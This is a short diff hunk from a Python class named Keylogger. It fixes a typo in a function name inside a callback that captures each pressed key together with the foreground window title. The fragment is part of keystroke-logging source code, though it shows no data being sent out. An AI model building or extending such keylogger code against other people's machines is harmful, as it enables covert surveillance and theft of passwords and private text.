@@ -73,7 +73,7 @@ class Keylogger:
     
     def callback(self, event):
         name = event.name
-        window = wgetForegroundWindowTitle()
+        window = getForegroundWindowTitle()
         if len(name) == 1:
             self.current_string += name
 
